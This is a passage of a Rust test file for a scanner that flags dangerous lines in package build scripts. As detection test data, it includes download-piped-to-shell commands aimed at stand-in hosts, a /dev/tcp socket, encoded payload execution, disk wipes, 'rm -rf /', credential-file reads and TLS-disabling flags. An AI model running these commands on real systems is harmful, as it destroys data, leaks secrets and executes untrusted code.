//! Tests for `rules`.

use super::destructive::removes_root_or_home;
use super::matchers::is_encoded_data_executed;
use super::{
    RuleId, Scheme, extract_network_destinations, is_documentation, is_download_piped_to_shell,
    is_ip_host, is_sensitive_path, line_rules, looks_like_credential_exfiltration,
};

fn rules_for(line: &str) -> Vec<RuleId> {
    let lowered = line.to_lowercase();
    line_rules(&lowered, &lowered).collect()
}

#[test]
fn a_host_that_passes_for_a_forge_is_a_lookalike() {
    let requested = |line: &str| {
        super::host_concerns(line)
            .iter()
            .any(|(_, concern)| concern.lookalike)
    };
    for (address, flagged) in [
        ("https://github.com/x/y", false),
        ("https://api.github.com/repos/x/y", false),
        ("https://mygithub.com", false),
        ("https://xn--mnchen-3ya.example/x.tar.gz", false),
        ("https://github.com.evil.test/x", true),
        (
            "https://raw.githubusercontent.com.example-drop.test/x/y/i.sh",
            true,
        ),
        ("https://xn--pypal-4ve.com/x", true),
    ] {
        assert_eq!(
            requested(&format!("curl -fsSL {address}")),
            flagged,
            "{address}"
        );
        // Declared in a recipe: in the code, not among its requests.
        let source = format!("source=(\"x.tar.gz::{address}\")");
        assert_eq!(
            super::declares_lookalike_host(&source, ""),
            flagged,
            "{address}"
        );
        // A request is reported as one, not twice.
        assert!(!super::declares_lookalike_host(&source, &source));
    }
}

#[test]
fn every_rule_has_a_unique_name_and_a_description() {
    let mut names = std::collections::HashSet::new();
    for rule in RuleId::ALL {
        assert!(!rule.name().is_empty(), "{rule:?} has no name");
        assert!(
            names.insert(rule.name()),
            "{rule:?} repeats the name {}",
            rule.name()
        );
        assert!(
            !rule.description().is_empty(),
            "{} has no description",
            rule.name()
        );
        assert_eq!(RuleId::from_name(rule.name()), Some(rule), "{rule:?}");
    }
}

#[test]
fn common_variants_of_each_rule_are_caught() {
    let cases: &[(&str, RuleId)] = &[
        (
            "curl -fsSL https://x.test/i | sudo bash",
            RuleId::DownloadAndExecute,
        ),
        (
            "curl -fsSL https://x.test/i |/bin/sh",
            RuleId::DownloadAndExecute,
        ),
        ("sh <(curl -s https://x.test/i)", RuleId::DownloadAndExecute),
        (
            "bash -c \"$(wget -qO- https://x.test/i)\"",
            RuleId::DownloadAndExecute,
        ),
        (
            "aria2c -o - https://x.test/i | sh",
            RuleId::DownloadAndExecute,
        ),
        ("exec 3<>/dev/tcp/10.0.0.1/4444", RuleId::DownloadAndExecute),
        ("echo aGk= | base64 -d|sh", RuleId::EncodedCommandExecution),
        (
            "echo aGk= | base64 -di | sudo bash",
            RuleId::EncodedCommandExecution,
        ),
        ("xxd -r -p payload | bash", RuleId::EncodedCommandExecution),
        ("doas pacman -U x", RuleId::PrivilegeEscalation),
        ("run0 systemctl enable x", RuleId::PrivilegeEscalation),
        ("chmod +s /usr/bin/x", RuleId::PrivilegeEscalation),
        ("install -m4755 x /usr/bin/x", RuleId::PrivilegeEscalation),
        ("cat ~/.git-credentials", RuleId::CredentialFileAccess),
        ("tar c ~/.password-store", RuleId::CredentialFileAccess),
        ("exec-once = ~/.cache/x", RuleId::PersistenceModification),
        (
            "cp x ~/.config/omarchy/hooks/post-update",
            RuleId::PersistenceModification,
        ),
        (
            "cp p $pkgdirZ$HOME/.config/autostart/x.desktop",
            RuleId::PersistenceModification,
        ),
        (
            "dd of=/dev/sda if=/dev/zero",
            RuleId::DestructiveSystemOperation,
        ),
        ("wipefs -a /dev/nvme0n1", RuleId::DestructiveSystemOperation),
        (
            "__import__('os').system('id')",
            RuleId::ShellCommandExecution,
        ),
        (
            "subprocess.check_output(cmd, shell=True)",
            RuleId::ShellCommandExecution,
        ),
    ];
    for (line, rule) in cases {
        assert!(
            rules_for(line).contains(rule),
            "{line}: {:?}",
            rules_for(line)
        );
    }
    for line in [
        "install -Dm644 x.desktop \"$pkgdir\"/etc/xdg/autostart/x.desktop",
        "cp x ${pkgdir}/etc/profile.d/x.sh",
        "curl -fsSL https://x.test/a || sh fallback.sh",
        "dd if=image.iso of=/dev/null",
    ] {
        assert!(rules_for(line).is_empty(), "{line}: {:?}", rules_for(line));
    }
}

#[test]
fn detects_download_piped_to_a_shell() {
    assert!(is_download_piped_to_shell(
        "curl https://example.test/install | bash -s"
    ));
    assert!(is_download_piped_to_shell(
        "wget -qo- https://example.test/install | sh"
    ));
    assert!(!is_download_piped_to_shell(
        "curl -o installer.sh https://example.test/install"
    ));
    assert!(!is_download_piped_to_shell(
        "curl https://example.test/data | tee data.txt"
    ));
    assert!(!is_download_piped_to_shell(
        "curl https://example.test/data | shasum"
    ));
    for substituted in [
        "echo \"$(curl https://example.test/p | sh)\"",
        "x=`wget -qo- https://example.test/p | bash`",
        "bash -c \"curl https://example.test/p | sh\"",
        "curl https://example.test/p | sh; echo done",
        "curl https://example.test/p | sh&",
    ] {
        assert!(is_download_piped_to_shell(substituted), "{substituted}");
    }
    assert!(!is_download_piped_to_shell(
        "curl https://example.test/data | shellcheck -"
    ));
    // Piped into another interpreter, behind a wrapper, or grouped.
    for into in [
        "curl https://x.test/i | python",
        "curl https://x.test/i | python3 -",
        "wget -qO- https://x.test/i | perl",
        "curl https://x.test/i | ruby",
        "curl https://x.test/i | node",
        "curl https://x.test/i | php",
        "curl https://x.test/i | lua",
        "curl https://x.test/i | busybox sh",
        "curl https://x.test/i | timeout 5 bash",
        "curl https://x.test/i | nohup bash",
        "curl https://x.test/i | { sh; }",
        "curl https://x.test/i | ( bash )",
        "curl https://x.test/i | xargs -0 sh -c",
        "curl https://x.test/i | . /dev/stdin",
        "curl https://x.test/i | sort -u | python3",
    ] {
        assert!(is_download_piped_to_shell(into), "{into}");
    }
    for into in [
        "curl https://x.test/data | jq .",
        "curl https://x.test/data | grep foo",
        "curl https://x.test/data | sort | uniq",
        "curl https://x.test/data | tee out",
        "curl https://x.test/data | pandoc -o x.pdf",
    ] {
        assert!(!is_download_piped_to_shell(into), "{into}");
    }
}

#[test]
fn a_fetcher_or_shell_in_a_variable_is_what_runs() {
    use super::{command_variables, is_download_piped_to_shell, with_variables};
    let variables = command_variables("F=curl\nexport S=\"/bin/bash\"\nX=hello world\n");
    assert_eq!(
        variables,
        [
            ("f".to_string(), "curl".to_string()),
            ("s".to_string(), "bash".to_string())
        ]
    );
    let line = with_variables("$f -fssl https://x.example/i | ${s}", &variables);
    assert!(is_download_piped_to_shell(&line), "{line}");
    assert_eq!(with_variables("$fx $s_y", &variables), "$fx $s_y");
}

#[test]
fn what_a_line_runs_is_named() {
    use super::run_targets;
    for (line, expected) in [
        ("sh ./install.sh --yes", &["install.sh"][..]),
        (". ./lib/common", &["lib/common"]),
        (
            "python3.12 tools/gen.py && ./build/run",
            &["tools/gen.py", "build/run"],
        ),
        ("cat payload.bin | sh", &["payload.bin"]),
        ("sh <data/x.png", &["data/x.png"]),
        ("FOO=1 bash -e scripts/x.sh", &["scripts/x.sh"]),
    ] {
        assert_eq!(run_targets(line), expected, "{line}");
    }
    // Many pipes cost one pass.
    let long = "a|".repeat(200_000);
    let started = std::time::Instant::now();
    assert!(run_targets(&long).is_empty());
    assert!(started.elapsed().as_secs() < 10);
    assert_eq!(run_targets("nohup sh ./x.sh &"), ["x.sh"]);
    for line in [
        "sh -c 'echo hi'",
        "bash -n x.sh",
        "python -m pip install x",
        "cat notes.txt",
        "echo sh x",
    ] {
        assert!(run_targets(line).is_empty(), "{line}");
    }
}

#[test]
fn a_download_saved_to_a_file_is_followed_to_where_it_runs() {
    use super::run::fetched_file;
    use super::{continues, runs_file};
    for (line, file) in [
        (
            "curl -fssl https://x.example/i.sh -o /tmp/i.sh",
            "/tmp/i.sh",
        ),
        ("curl https://x.example/i.sh > ./i.sh", "i.sh"),
        ("curl https://x.example/i.sh >i.sh", "i.sh"),
        ("curl -O https://x.example/a/i.sh?x=1", "i.sh"),
        ("sudo wget -q https://x.example/a/i.sh", "i.sh"),
        ("wget -O \"$tmp\" https://x.example/a/i.sh", "$tmp"),
        ("wget -o fetch.log https://x.example/a/i.sh", "i.sh"),
        ("aria2c --out=i.sh https://x.example/a", "i.sh"),
    ] {
        assert_eq!(fetched_file(line).as_deref(), Some(file), "{line}");
    }
    assert_eq!(fetched_file("curl https://x.example/i.sh"), None);
    assert_eq!(fetched_file("wget -qO- https://x.example/i.sh"), None);
    assert_eq!(fetched_file("wget -O- https://x.example/i.sh"), None);
    assert_eq!(fetched_file("wget -O - https://x.example/i.sh"), None);
    for line in [
        "wget -qO- https://x.example/i.sh > i.sh",
        "wget -q https://x.example/i.sh -O - >> i.sh",
        "wget --output-document=- https://x.example/i.sh >i.sh",
        "curl -o - https://x.example/i.sh > i.sh",
    ] {
        assert_eq!(fetched_file(line).as_deref(), Some("i.sh"), "{line}");
    }
    assert_eq!(fetched_file("echo saved > out.txt"), None);

    for line in [
        "sh i.sh",
        "sudo bash ./i.sh --yes",
        ". i.sh",
        "chmod +x i.sh && ./i.sh",
        "if true; then python3 i.sh; fi",
    ] {
        assert!(runs_file(line, "i.sh"), "{line}");
    }
    assert!(runs_file("bash i.sh -n", "i.sh"));
    assert!(!runs_file("bash -n i.sh", "i.sh"));
    assert!(runs_file("perl -n i.sh", "i.sh"));
    assert!(runs_file("bash -m i.sh", "i.sh"));
    assert!(runs_file("bash \"$tmp\"", "$tmp"));
    assert!(runs_file("\"$tmp\" --install", "$tmp"));
    for line in [
        "cat i.sh",
        "chmod +x i.sh",
        "sh other.sh",
        "echo sh i.sh > log",
    ] {
        assert!(!runs_file(line, "i.sh"), "{line}");
    }

    assert!(continues("curl https://x.example/i.sh \\", "  | sh"));
    assert!(continues("curl https://x.example/i.sh |", "sh"));
    assert!(continues("curl https://x.example/i.sh", "  | sh"));
    assert!(!continues("curl https://x.example/i.sh", "sh i.sh"));
}

#[test]
fn a_run_behind_a_wrapper_an_assignment_or_a_group_is_still_a_run() {
    use super::{run_targets, runs_file};
    for line in [
        "nohup sh i.sh",
        "FOO=1 bash i.sh",
        "time sh i.sh",
        "setsid bash i.sh",
        "! sh i.sh",
        "chmod +x i.sh; nohup ./i.sh &",
        "timeout 5 sh i.sh",
        "timeout --signal=9 10 ./i.sh",
        "( sh i.sh )",
        "(sh i.sh)",
        "{ sh ./i.sh; }",
        "sudo -u x sh i.sh",
        "if sh i.sh; then",
        "while ! ./i.sh; do",
        "exec = sh i.sh",
        "exec-once = sh i.sh",
    ] {
        assert!(runs_file(line, "i.sh"), "{line}");
        assert_eq!(
            run_targets(line).first().map(String::as_str),
            Some("i.sh"),
            "{line}"
        );
    }
    for line in [
        "nohup cat i.sh",
        "FOO=i.sh",
        "X=sh echo i.sh",
        "timeout 5 cat i.sh",
        "( cat i.sh )",
        "sudo -u sh cat i.sh",
        "if [ -f i.sh ]; then",
        "time bash -n i.sh",
        "exec = cat i.sh",
        "name = i.sh",
    ] {
        assert!(!runs_file(line, "i.sh"), "{line}");
        assert!(run_targets(line).is_empty(), "{line}");
    }
    // A name that ends in a `)` of its own keeps it.
    // A name that ends in a `)` may be a file's own or a group's close,
    // on this line or one before: both names are given.
    assert_eq!(run_targets("./'blob)'"), ["blob", "blob)"]);
    assert_eq!(run_targets("sh 'blob)'"), ["blob", "blob)"]);
    assert_eq!(
        run_targets("  ./configure && ./i.sh)"),
        ["configure", "i.sh", "i.sh)"]
    );
    assert!(runs_file("curl -o ')' https://x.example/a; sh ')'", ")"));
    // A setting whose value begins with a path is read as a command too.
    assert!(runs_file("ExecStart=/bin/sh i.sh", "i.sh"));
    for unit in [
        "ExecStart=-/bin/sh i.sh",
        "ExecStartPre=+/bin/sh i.sh",
        "ExecStart=!!/bin/sh i.sh",
        "ExecStartPost=-+/bin/bash i.sh",
    ] {
        assert!(runs_file(unit, "i.sh"), "{unit}");
    }
    assert!(runs_file("FOO=/bin/sh i.sh", "i.sh"));
    assert!(!runs_file("FOO=/bin/cat i.sh", "i.sh"));
}

#[test]
fn encoded_data_is_only_flagged_when_it_is_executed() {
    assert!(is_encoded_data_executed("exec(base64.b64decode(payload))"));
    assert!(!is_encoded_data_executed(
        "payload = base64.b64decode(encoded_data)"
    ));
}

#[test]
fn recursive_removal_only_matches_root_or_home_itself() {
    for dangerous in [
        "rm -rf /",
        "sudo rm -rf / ",
        "rm -rf /*",
        "rm -fr ~/",
        "rm -r --no-preserve-root /",
        "rm -rf \"$home\"",
        "rm -rf ${home}/*",
        "/usr/bin/rm -rf ~",
        "rm / -rf",
    ] {
        assert!(removes_root_or_home(dangerous), "missed {dangerous:?}");
    }
    for ordinary in [
        "rm -rf /tmp/build",
        "rm -rf /usr/share/foo",
        "rm -rf \"$pkgdir\"",
        "rm -rf ~/.cache/thing",
        "rm -f /",
        "rm -rf build; ls /",
        "echo rm -rf",
    ] {
        assert!(!removes_root_or_home(ordinary), "flagged {ordinary:?}");
    }
}

#[test]
fn sandbox_helper_setuid_is_expected_packaging() {
    for packaging in [
        "chmod 4755 \"${pkgdir}\"/opt/1password/chrome-sandbox",
        "chmod 4755 \"$pkgdir/opt/brave-bin/chrome-sandbox\";",
        "chmod 4755 '/opt/obsidian/chrome-sandbox' || true",
        "chmod u+s chrome-sandbox",
        "chmod 4755 \"${pkgdir}/opt/grok bot/chrome-sandbox\"",
        "chmod 4755 \"${pkgdir}/opt/microsoft/msedge/msedge-sandbox\"",
        "chmod 4755 \"$pkgdir/usr/lib/opera-gx/opera_sandbox\"",
        "chown root \"$pkgdir/usr/lib/chromium/chrome-sandbox\"",
    ] {
        assert!(
            !rules_for(packaging).contains(&RuleId::PrivilegeEscalation),
            "{packaging}"
        );
    }
    for escalation in [
        "chmod 4755 /opt/x/chrome-sandbox && sudo id",
        "chmod 4755 /opt/x/chrome-sandbox /usr/bin/bash",
        "chmod 4755 /opt/x/chrome-sandbox-helper",
        "chmod 4755 /opt/x/chrome-sandbox; chmod u+s /usr/bin/bash",
        "chmod u+s /usr/bin/bash",
        "chown root /usr/bin/x",
    ] {
        assert!(
            rules_for(escalation).contains(&RuleId::PrivilegeEscalation),
            "{escalation}"
        );
    }
}

#[test]
fn packaging_a_mkfs_program_is_not_running_it() {
    for packaging in [
        "install -dm755 \"$srcdir/docker-sbx/mkfs.erofs\" \\",
        "\"$pkgdir/usr/lib/${pkgname}/libexec/mkfs.erofs\"",
        "sudo install -m755 mkfs.x /usr/bin/",
        "ln -s mkfs.ext4 \"$pkgdir/usr/bin/mkfs.ext3\"",
    ] {
        assert!(
            !rules_for(packaging).contains(&RuleId::DestructiveSystemOperation),
            "{packaging}"
        );
    }
    for running in [
        "mkfs.ext4 /dev/sda",
        "sudo mkfs.vfat -f32 \"$dev\"",
        "os.system(\"mkfs.ext4 /dev/sda\")",
        "install x mkfs.y; mkfs.ext4 /dev/sda",
        "x=$(mkfs.btrfs -f /dev/sdb)",
        // The word a wrapper's option takes is not the program.
        "env -u install mkfs.ext4 /dev/sda",
        "exec -a rm mkfs.btrfs -f /dev/nvme0n1",
        "run0 --unit install mkfs.ext4 /dev/sda",
        "sudo -u install mkfs.ext4 /dev/sda",
    ] {
        assert!(
            rules_for(running).contains(&RuleId::DestructiveSystemOperation),
            "{running}"
        );
    }
}

#[test]
fn packaged_startup_files_are_not_persistence() {
    for packaging in [
        "install -dm644 x.sh \"${pkgdir}/etc/profile.d/x.sh\"",
        "} >>\"${pkgdir}/etc/profile.d/x.sh\"",
        "\"$pkgdir\"/etc/cron.daily/ \\",
        "install -d -m644 x.timer \"$pkgdir/etc/systemd/system/x.timer\"",
    ] {
        assert!(
            !rules_for(packaging).contains(&RuleId::PersistenceModification),
            "{packaging}"
        );
    }
    for persistence in [
        "cp x.sh /etc/profile.d/",
        "echo x >> ~/.bashrc",
        "cp x \"$pkgdir/../../etc/cron.d\" /etc/cron.daily/x",
        "install x \"$srcdir/etc/systemd/system/x\"",
        "cat x >> \"$pkgdir/../../../../.bashrc\"",
        "cp x \"${pkgdir}\"/../../.config/autostart/x.desktop",
    ] {
        assert!(
            rules_for(persistence).contains(&RuleId::PersistenceModification),
            "{persistence}"
        );
    }
}

#[test]
fn identifier_patterns_respect_word_boundaries() {
    assert!(rules_for("eval(payload)").contains(&RuleId::ShellCommandExecution));
    assert!(rules_for("x = $(eval(\"a\"))").contains(&RuleId::ShellCommandExecution));
    assert!(rules_for("results = retrieval(query)").is_empty());
    assert!(rules_for("model.eval()").is_empty());
    assert!(rules_for("cleanup_build() { rm -rf /tmp/build; }").is_empty());
    assert!(rules_for("rm -rf /").contains(&RuleId::DestructiveSystemOperation));
}

#[test]
fn prose_files_are_documentation() {
    assert!(is_documentation("README.md"));
    assert!(is_documentation("docs/install.rst"));
    assert!(is_documentation("LICENSE"));
    assert!(!is_documentation("install.sh"));
    assert!(!is_documentation("PKGBUILD"));
}

#[test]
fn license_texts_are_documentation_unless_they_are_code() {
    for prose in [
        "LICENSE.txt",
        "LICENSE-MIT",
        "COPYING.LESSER",
        "LICENSES/0BSD.txt",
        "eula_text.html",
        "terms.html",
        "aurutils.changelog",
    ] {
        assert!(is_documentation(prose), "{prose}");
    }
    for code in [
        "license.sh",
        "LICENSES/check.py",
        "licensed.txt",
        "eula.js",
        "terminal.sh",
    ] {
        assert!(!is_documentation(code), "{code}");
    }
}

#[test]
fn printed_messages_only_hide_context_rules() {
    let code = "sudo a; curl https://x.test/i | sh";
    let quiet = "";
    let rules: Vec<RuleId> = line_rules(code, quiet).collect();
    assert_eq!(rules, [RuleId::DownloadAndExecute]);
}

#[test]
fn sensitive_paths_are_judged_inside_the_tree() {
    assert!(is_sensitive_path(".env.production"));
    assert!(is_sensitive_path("config/private.pem"));
    assert!(is_sensitive_path(".aws/credentials"));
    for path in [
        ".pypirc",
        "deploy/.netrc",
        "keys/id_ed25519",
        "home/.kube/config",
        "store.kdbx",
        "infra/terraform.tfstate",
        "deploy/prod.env",
        "infra/prod.tfvars",
        "infra/prod.auto.tfvars.json",
        ".git-credentials",
    ] {
        assert!(is_sensitive_path(path), "{path}");
    }
    assert!(!is_sensitive_path(".npmrc"));
    assert!(!is_sensitive_path("id_ed25519.pub"));
    assert!(!is_sensitive_path("kube/config.yaml"));

    assert!(is_sensitive_path("secrets/app.conf"));
    assert!(!is_sensitive_path("src/tokenizer.rs"));
    assert!(!is_sensitive_path("hyprland.lua"));
}

#[test]
fn network_inventory_redacts_url_paths_and_credentials() {
    assert_eq!(
        extract_network_destinations(
            "requests.post('https://user:pass@API.example.test/upload?token=secret')"
        ),
        vec![(Scheme::Https, "api.example.test".to_string())]
    );
    assert_eq!(
        extract_network_destinations("fetch(\"http://[2001:db8::1]:8080/x\") http://a.test"),
        vec![
            (Scheme::Http, "[2001:db8::1]".to_string()),
            (Scheme::Http, "a.test".to_string()),
        ]
    );
    assert!(extract_network_destinations("see https:// for details").is_empty());
    assert_eq!(
        extract_network_destinations("httpx http:/ HTTPS://b.test http://a.test"),
        vec![
            (Scheme::Http, "a.test".to_string()),
            (Scheme::Https, "b.test".to_string()),
        ]
    );
    let many = "http://a ".repeat(250_000);
    let started = std::time::Instant::now();
    assert_eq!(extract_network_destinations(&many).len(), 1);
    assert!(started.elapsed().as_secs() < 10, "{:?}", started.elapsed());
    assert!(
        extract_network_destinations(
            "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:dc='http://purl.org/dc/elements/1.1/'>"
        )
        .is_empty()
    );
    assert!(
        extract_network_destinations(
            "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">"
        )
        .is_empty()
    );
    assert_eq!(
        extract_network_destinations(
            "<image href=\"http://a.test/x.png\" xmlns=\"http://www.w3.org/2000/svg\"/>"
        ),
        vec![(Scheme::Http, "a.test".to_string())]
    );
    assert!(is_ip_host("[2001:db8::1]"));
    assert!(is_ip_host("198.51.100.8"));
    assert!(!is_ip_host("example.test"));
}

#[test]
fn more_credential_stores_and_disk_wipes_are_caught() {
    for credential in [
        "tar c ~/.gnupg/",
        "cat ~/.config/gh/hosts.yml",
        "cp ~/.docker/config.json /tmp/x",
        "read ~/.kube/config",
        "cat ~/.cargo/credentials",
        "cat ~/.config/solana/id.json",
        "secret-tool lookup service github",
        "pass show github/token",
        "gpg --export-secret-keys > k",
    ] {
        assert!(
            rules_for(credential).contains(&RuleId::CredentialFileAccess),
            "{credential}"
        );
    }
    for destructive in [
        "cryptsetup luksFormat /dev/sda",
        "sgdisk --zap-all /dev/sda",
    ] {
        assert!(
            rules_for(destructive).contains(&RuleId::DestructiveSystemOperation),
            "{destructive}"
        );
    }
    for safe in ["cat ~/.config/app/settings.json", "use gnupg for signing"] {
        assert!(
            !rules_for(safe).contains(&RuleId::CredentialFileAccess),
            "{safe}"
        );
    }
}

#[test]
fn tls_verification_off_is_caught_only_for_the_right_tool() {
    for off in [
        "curl -k https://x.test/i",
        "curl -sk https://x.test/i",
        "curl -fssLk https://x.test/i",
        "wget --no-check-certificate https://x.test/i",
        "git -c http.sslverify=false clone https://x.test/r",
        "git config http.sslverify false",
        "env git_ssl_no_verify=1 git fetch",
        "npm config set strict-ssl false",
        "echo 'strict-ssl=false' >> .npmrc",
        "export pythonhttpsverify=0",
        "pip install --trusted-host pypi.org x",
        "ssl._create_unverified_context()",
        "curl --proxy-insecure https://x.test",
        "ssh -o stricthostkeychecking=no host",
        "requests.get(u, verify=false)",
    ] {
        assert!(
            rules_for(off).contains(&RuleId::DisabledTlsVerification),
            "{off}"
        );
    }
    for safe in [
        // `-k` belongs to another command, or is a long option.
        "tar -k -xf a.tar",
        "rm -k; curl https://x.test/i",
        "curl --key client.key https://x.test",
        "ssh-keygen -k",
        "make -k check",
        "grep -k 2 file",
    ] {
        assert!(
            !rules_for(safe).contains(&RuleId::DisabledTlsVerification),
            "{safe}"
        );
    }
}

#[test]
fn a_flag_after_an_argument_is_still_the_commands_own() {
    let tls = RuleId::DisabledTlsVerification;
    let protection = RuleId::ProtectionDisabled;
    for (line, rule) in [
        ("curl https://x.test/i -k", tls),
        ("curl -s https://x.test/i -k -o f", tls),
        ("sudo -u build curl -o f https://x.test/i -sk", tls),
        ("timeout 5 curl https://x.test/i -k", tls),
        ("true; curl https://x.test/i -k; true", tls),
        ("curl https://x.test/i -k | tar xz", tls),
        ("curl \"https://x.test/i?a=1&b=2\" -k", tls),
        // A group's opening word is read past, like any wrapper.
        ("(curl -k https://x.test/i)", tls),
        ("if ! (curl https://x.test/i -k); then", tls),
        // A setting's value, and a program another one is given.
        ("ExecStart=/usr/bin/curl -k https://x.test/i", tls),
        ("xargs curl -k", tls),
        // Shown into a shell or a file is not only shown.
        ("echo curl -k https://x.test/i | sh", tls),
        ("echo curl -k https://x.test/i > fetch.sh", tls),
        ("iptables -t nat -F", protection),
        ("sudo iptables -t filter -F INPUT", protection),
        ("ip6tables -F", protection),
        ("ip6tables -t mangle -F", protection),
        ("/usr/bin/ip6tables -w -F", protection),
        // A flush beside a rule is still a flush.
        ("iptables -F && iptables -A INPUT -j ACCEPT", protection),
        ("iptables -A INPUT -j ACCEPT; iptables -F", protection),
        ("iptables -F; iptables -A INPUT -j ACCEPT", protection),
        ("iptables -A INPUT -f -j DROP; iptables -F", protection),
        // A quote inside the name is no part of it.
        ("ipt\"\"ables -F", protection),
        ("sudo ip'tables' -F", protection),
        ("c\"\"url -k https://x.test/i", tls),
        // What follows a command that only shows is run.
        ("echo ${x#(}; iptables -F", protection),
        ("echo ${x:-(}; curl -k https://x.test/i", tls),
        ("echo \\(; iptables -F", protection),
    ] {
        assert!(rules_for(line).contains(&rule), "{line}");
    }
    for (line, rule) in [
        ("echo curl -k", tls),
        ("printf '%s\\n' curl https://x.test/i -k", tls),
        ("curl https://x/-k", tls),
        ("curl https://x.test/i --key client.key", tls),
        // The flag is another program's, later on the line.
        ("curl https://x.test/i && tar -k -xf a.tar", tls),
        ("curl https://x.test/i | tar -k -x", tls),
        ("curl https://x.test/i; make -k check", tls),
        ("curl https://x.test/i & grep -k x", tls),
        ("(curl https://x.test/i && tar -k -xf a.tar)", tls),
        ("xargs curl https://x.test/i | sort -k 2", tls),
        ("echo iptables -F", protection),
        ("iptables -L -n; ls -f", protection),
        ("iptables -L && rm -f x", protection),
        ("ip6tables -L | grep -f patterns", protection),
        ("iptables -A INPUT -f -j DROP", protection),
        ("sudo ip6tables -I INPUT 1 -f -j ACCEPT", protection),
        ("iptables -A INPUT -f --jump DROP", protection),
        ("iptables -A INPUT -f -g CHAIN", protection),
        ("iptables -A INPUT -f", protection),
        // The program is only what a variable is set to.
        (
            "IPTABLES=/usr/bin/iptables make -f Makefile.linux",
            protection,
        ),
        ("CURL=/usr/bin/curl make -k", tls),
        ("PREFIX=/usr/lib/curl make -k install", tls),
        ("iptables-save -f /etc/iptables/rules.v4", protection),
    ] {
        assert!(!rules_for(line).contains(&rule), "{line}");
    }
}

#[test]
fn every_reader_knows_the_same_wrappers() {
    use super::{run_globs, run_targets, runs_file};
    // Piped into a shell that another user runs.
    assert!(is_download_piped_to_shell(
        "curl https://x.test/i | sudo -u nobody bash"
    ));
    assert!(!is_download_piped_to_shell(
        "curl https://x.test/data | sudo -u sh cat"
    ));
    // A glob run behind a time limit, an assignment or a group.
    for (line, globs) in [
        ("timeout 5 bash scripts/*", &["scripts/*"][..]),
        ("X=1 nohup sh hooks.d/*.sh", &["hooks.d/*.sh"]),
        ("(for h in hooks.d/*", &["hooks.d/*"]),
        ("if run-parts d; then", &["d"]),
    ] {
        assert_eq!(run_globs(line), globs, "{line}");
    }
    for line in [
        "timeout 5 ls scripts/*",
        "X=1 cat notes/*.txt",
        // What a variable is given by `find` is a name found.
        "x=$(find scripts -type f | head -1)",
        "local x=$(find target -name app | head -n 1)",
        "x=`find scripts -type f | head -1`",
    ] {
        assert!(run_globs(line).is_empty(), "{line}");
    }
    // What is read into a shell behind a wrapper, or into any shell.
    assert_eq!(run_targets("cat payload.bin | sudo sh"), ["payload.bin"]);
    assert_eq!(run_targets("cat payload.bin | fish"), ["payload.bin"]);
    // `-n` only parses, for every shell.
    assert!(runs_file("fish i.sh", "i.sh"));
    assert!(!runs_file("fish -n i.sh", "i.sh"));
    assert!(run_targets("fish -n i.sh").is_empty());
    assert!(run_targets("fish -ic 'echo hi'").is_empty());
    // A file command behind a wrapper still only handles the file, and
    // a program behind one still runs.
    for packaging in [
        "env install -m755 mkfs.x /usr/bin/",
        "if test -x mkfs.ext4; then",
        "(rm mkfs.x y)",
        "X=1 install -m755 mkfs.x \"$pkgdir/usr/bin/\"",
    ] {
        assert!(
            !rules_for(packaging).contains(&RuleId::DestructiveSystemOperation),
            "{packaging}"
        );
    }
    for running in [
        "sudo -u install mkfs.ext4 /dev/sda",
        "nohup mkfs.ext4 /dev/sda",
        "X=\"$(mkfs.ext4 /dev/sda)\" ls",
    ] {
        assert!(
            rules_for(running).contains(&RuleId::DestructiveSystemOperation),
            "{running}"
        );
    }
    assert_eq!(
        super::command_variables("S=fish\nK=/bin/ksh\n"),
        [
            ("s".to_string(), "fish".to_string()),
            ("k".to_string(), "ksh".to_string())
        ]
    );
}

#[test]
fn a_long_line_costs_each_reader_one_pass() {
    use super::destructive::formats_filesystem;
    use super::matchers::program_short_flag;
    use super::{pipes_into_shell, run_globs, run_targets};
    let started = std::time::Instant::now();
    // Many commands, many wrappers, a group never closed.
    assert!(!program_short_flag(
        &"curl -a;".repeat(50_000),
        &["curl"],
        'k',
        &[]
    ));
    assert!(!program_short_flag(
        &"(curl -a | ".repeat(40_000),
        &["curl"],
        'k',
        &[]
    ));
    assert!(program_short_flag(
        &("sudo ".repeat(80_000) + "curl a -k"),
        &["curl"],
        'k',
        &[]
    ));
    assert!(formats_filesystem(&"mkfs.x y;".repeat(40_000)));
    assert!(!formats_filesystem(
        &("sudo ".repeat(80_000) + "install mkfs.x")
    ));
    assert!(!pipes_into_shell(&"a|".repeat(200_000), |_| true));
    assert!(pipes_into_shell(
        &("a|".to_string() + &"sudo ".repeat(80_000) + "sh"),
        |_| true
    ));
    assert_eq!(run_globs(&"for a in b/*;".repeat(30_000)), ["b/*"]);
    assert_eq!(run_globs(&("x=".repeat(200_000) + " sh a/*")), ["a/*"]);
    assert_eq!(run_targets(&"cat a | sudo sh;".repeat(25_000)), ["a"]);
    assert!(started.elapsed().as_secs() < 10, "{:?}", started.elapsed());
}

#[test]
fn a_long_word_of_startup_files_is_read_once() {
    use super::is_persistence;
    // One word holding a startup file's name many times over: packaged,
    // climbing out of the package, and not packaged at all.
    let names = ".bashrc".repeat(30_000);
    assert!(!is_persistence(&format!("install x $pkgdir/{names}")));
    assert!(!is_persistence(&format!(
        "install x \"${{pkgdir}}\"/{names}"
    )));
    assert!(is_persistence(&format!("install x $pkgdir/{names}/../y")));
    assert!(is_persistence(&format!("install x $pkgdir/.\\./{names}")));
    assert!(is_persistence(&format!("install x $pkgdirs/{names}")));
    assert!(is_persistence(&names));
    // Only what stands in the same word counts.
    assert!(!is_persistence("cp .. $pkgdir/etc/profile.d/x.sh"));
    assert!(is_persistence("cp x $pkgdir/etc/profile.d/x.sh/.."));
    assert!(is_persistence("cp $pkgdir/a/../etc/profile.d/x.sh"));
    assert!(is_persistence("echo x >>\"$pkgdir/..\"/.bashrc"));
    assert!(!is_persistence("echo x >>\"$pkgdir/.bashrc.zshrc\" .."));
}

#[test]
fn commands_that_share_their_arguments_cost_one_pass() {
    use super::destructive::removes_root_or_home;
    use super::matchers::is_remote_shell;
    let removals = "rm -rf ".repeat(30_000);
    assert!(!removes_root_or_home(&removals));
    assert!(removes_root_or_home(&format!("{removals}/")));
    assert!(!removes_root_or_home(&format!("{removals}; /")));
    assert!(removes_root_or_home(&format!(
        "{}-rf /",
        "rm ".repeat(50_000)
    )));
    for (line, removes) in [
        ("rm / -rf", true),
        ("rm -rf a ~/;", true),
        ("rm -r a; rm /", false),
